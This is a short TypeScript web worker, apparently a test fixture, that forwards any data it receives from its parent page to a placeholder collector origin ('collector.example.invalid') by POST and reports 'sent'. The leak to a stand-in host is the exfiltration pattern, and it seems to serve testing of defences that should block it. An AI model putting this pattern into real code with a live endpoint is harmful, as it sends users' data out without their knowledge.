/** Sends what it receives to another origin (a name that never resolves, RFC 6761). */
const LEAK_ORIGIN = 'https://collector.example.invalid';

self.addEventListener('message', (event: MessageEvent<ArrayBuffer>) => {
  // A dedicated worker only hears its parent, and such events carry an empty origin.
  if (event.origin !== '') {
    return;
  }
  void fetch(`${LEAK_ORIGIN}/collect`, { method: 'POST', body: event.data })
    .catch(() => undefined)
    .finally(() => {
      self.postMessage('sent');
    });
});
